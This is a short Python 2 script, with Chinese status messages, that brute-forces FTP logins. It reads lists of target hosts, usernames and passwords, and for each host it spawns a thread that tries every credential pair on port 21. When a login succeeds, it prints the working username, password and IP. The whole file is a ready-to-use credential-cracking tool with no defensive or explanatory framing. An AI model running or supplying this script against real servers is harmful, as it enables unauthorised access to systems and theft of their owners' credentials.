#!usr/bin/env python
#!coding=utf-8

from ftplib import FTP
import ftplib
import threading

def Login(host):
    print '破解主机：' + host
    user=open('namelist.txt')
    for line in user:
        user=line.strip('\n')
        print '破解用户：' + user
        pwd=open('password.lst','r')
        for line in pwd:
            pwd=line.strip('\n')
            print '==>' + pwd
            ftp=FTP()
            try:
                ftp.connect(host,21,1)
                ftp.login(user,pwd)
                
                ftp.retrlines('LIST')
                ftp.quit()
                print '破解成功,用户名：' + user +'，密码：' + pwd + ',IP:'+ host
                return True
            except ftplib.all_errors:
                pass
    
host=open('host.txt')
for line in host:
    host=line.strip('\n')
    t=threading.Thread(target=Login, args=(host,))
    t.start()